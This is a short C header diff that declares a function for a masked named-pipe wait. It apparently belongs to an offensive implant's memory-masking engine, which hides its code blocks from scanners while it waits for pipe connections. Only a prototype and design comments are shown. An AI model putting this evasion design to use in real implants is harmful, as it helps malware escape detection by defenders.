@@ -18,6 +18,15 @@
  */
 BOOL gen3_sleep(DWORD time);
 
+/* Phase 2 wait-window: masked blocking wait for the pipe channels. Masks
+ * every gen3 block, calls ConnectNamedPipe through a pre-resolved pointer
+ * (no API between mask and unmask), unmasks, returns TRUE when the wait
+ * was served masked (connection established or already connected). No
+ * timers - immune to CFG hosts and indefinite by construction. Returns
+ * FALSE (caller falls back to the unmasked plan-B wait) when the engine
+ * is unavailable. x86: always FALSE. */
+BOOL gen3_wait_pipe(HANDLE pipe);
+
 /* bisect/acceptance tracing (rounds 12-17): define G3_TRACE to compile the
  * file-logging probes back in; production builds compile them out. */
 #if defined(G3_TRACE)
